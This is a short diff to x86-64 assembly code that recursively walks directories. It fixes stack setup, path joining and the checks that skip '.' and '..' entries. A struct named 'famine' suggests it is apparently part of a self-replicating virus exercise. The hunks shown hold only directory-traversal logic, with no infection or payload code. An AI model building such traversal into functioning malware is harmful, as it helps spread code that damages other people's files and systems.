@@ -17,6 +17,7 @@ _start:
 ; rdx == 0 ? rien : recreate a path: rdi/rsi
 _initDir:
     ; placing famine on the stack
+    push rbp
     mov rbp, rsp
     sub rsp, famine_size
 
@@ -26,7 +27,11 @@ _initDir:
     je _readDir
     call _strlen                                             ; strlen(famine.pwd(rsi))
     add rsi, rax
+    mov BYTE [rsi], '/'
+    add rsi, 1
+    mov rdi, rdx
     call _strcpy
+    mov rdi, rsp
 
 _readDir:
     mov rax, SYS_OPEN 
@@ -67,9 +72,9 @@ _readDir:
             _recursif:
                 lea rdi, FAM(famine.pwd)
                 lea rdx, [r10 + D_NAME]                 ; rdi -> folder name
-                cmp DWORD [rdi], 0x0002e
+                cmp DWORD [rdx], 0x0002e
                 je _checkRead
-                cmp DWORD [rdi], 0x002e2e
+                cmp DWORD [rdx], 0x002e2e
                 je _checkRead
                 call _initDir
 
